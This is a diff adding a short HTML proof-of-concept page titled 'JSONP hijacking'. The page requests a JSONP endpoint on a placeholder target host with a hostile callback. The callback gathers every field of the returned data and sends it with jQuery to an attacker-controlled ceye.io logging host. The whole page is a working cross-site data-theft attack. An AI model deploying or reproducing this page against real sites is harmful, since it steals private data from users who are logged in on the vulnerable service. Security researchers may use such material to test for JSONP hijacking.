@@ -1,0 +1,58 @@
+<html>
+
+<head>
+
+<title>jsonp劫持</title>
+
+<meta charset="utf-8">
+
+</head>
+
+
+
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+
+
+
+<script>
+
+function jsonp_hack(v){
+
+alert("jsonp劫持");
+
+var h='';
+
+for(var key in v){
+
+var a=''
+
+a=key+' : '+v[key]+' ,'
+
+h+=a
+
+
+
+}
+
+alert(h);
+
+
+
+$.get('http://xxx.xxx.ceye.io?value='+h);
+
+
+
+}
+
+</script>
+
+<script src="http://xxx.xx.xx.xxx/jsonp/xxx.xxx?callback=jsonp_hack"></script>
+
+<body>
+
+<h1>jsonp劫持</h1>
+
+</body>
+
+</html>
+
